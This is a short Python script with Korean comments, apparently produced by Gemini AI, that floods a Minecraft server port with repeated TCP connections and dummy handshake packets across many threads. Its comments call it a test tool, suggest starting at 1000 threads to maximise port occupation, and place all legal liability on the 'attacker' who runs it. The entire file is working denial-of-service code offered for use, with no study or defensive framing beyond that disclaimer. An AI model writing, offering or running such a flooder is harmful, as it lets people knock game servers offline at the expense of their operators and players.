# 사용으로 인한 피해 및 손실, 법적 피해 보상은 모두 공격자(스크립트 실행자) 에게 있음을 숙지 하였음을 인지한 상태로 실행하십시오.
# 이 코드는 Gemini Ai 로 제작된 코드 입니다.
# 이 코드는 오픈소스 이며 전혀 "피해의 목적" 이 아닌 "테스트" 용도로 만들어 졌습니다.

# stop 을 터미널에 입력하면, 코드의 실행이 중단 됩니다.


import socket
import threading
import sys

# --- 설정 정보 ---
target_host = "192.168.0.1"
target_port = 25565
threads_count = 1  # 반응이 없을시 스레드 수를 높입니다. (추천 1000 시작)
stop_flag = False


def tcp_flood():
    global stop_flag
    # 서버가 인식할 수 있는 최소한의 마인크래프트 핸드셰이크 더미 데이터
    payload = b'\x06\x00\x00\x00\x00\x00\x00'

    while not stop_flag:
        try:
            # 소켓 생성 및 연결
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)  # 응답 없는 서버에 대비해 타임아웃 최소화

            s.connect((target_host, target_port))
            s.send(payload)  # 데이터 전송

            # 연결 유지 없이 즉시 닫고 다시 시도 (포트 점유율 극대화)
            s.close()
        except:
            # 에러 발생 시(차단 등) 무시하고 즉시 다음 시도
            continue


# 스레드 생성 및 실행
threads = []
print(f"[*] 테스트 시작: {target_host}:{target_port}")
print("[*] 중단하려면 'stop'을 입력하고 엔터를 누르세요.")

for i in range(threads_count):
    thread = threading.Thread(target=tcp_flood)
    thread.daemon = True
    thread.start()
    threads.append(thread)

# 사용자 입력 감시 루프
while True:
    try:
        command = sys.stdin.readline().strip().lower()
        if command == "stop":
            print("[!] 종료 요청 수신. 모든 스레드를 중단합니다...")
            stop_flag = True
            break
    except KeyboardInterrupt:
        stop_flag = True
        break

print("[*] 테스트가 종료되었습니다.")